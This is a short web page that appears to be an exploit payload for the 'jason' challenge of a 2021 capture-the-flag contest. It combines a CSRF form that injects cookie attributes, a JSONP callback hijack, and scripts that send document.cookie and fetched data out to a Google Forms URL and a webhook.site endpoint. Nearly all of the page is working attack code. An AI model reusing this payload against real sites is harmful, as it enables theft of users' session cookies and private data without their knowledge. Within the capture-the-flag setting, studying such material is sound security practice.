---
title: "xss"
permalink: /xss/
layout: xss
---


<div id="container">
    <h1>Welcome to this "maybe xss" program</h1>
</div>
<form action="https://jason.2021.chall.actf.co/passcode" id="csrf-form" method="POST">
    <input name="passcode" value="; secure; samesite=none">
</form>

<script>
    function load(data) {
        console.log("XSS DATA", data);
        console.log(JSON.stringify(data));
        var x = data.items.map(i => ` ${i} `).join('');
        var y = btoa(x);
        console.log(y);
        document.location = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFtcUgsFZNtbLvRPqgZnZ_9a1iAH1tJMZsbw/formResponse?entry.1498521609=" + y + ";cookie=>" + document.cookie;
    }

    function getFlag(webhook, flag) {
        payload = JSON.stringify(flag)
        fetch(webhook + payload)
            .then(res => console.log("DONE", res));
    }

    let url = "127.0.0.1:1337/api/entries"
    let webhook = "https://webhook.site/e1c87264-f400-40d6-afa9-6ba829adcfbe/"
    fetch(url)
        .then(res => res.text)
        .then(text => getFlag(webhook, text));

</script>

<script src="https://jason.2021.chall.actf.co/languages?callback=load" referrerpolicy="no-referrer"></script>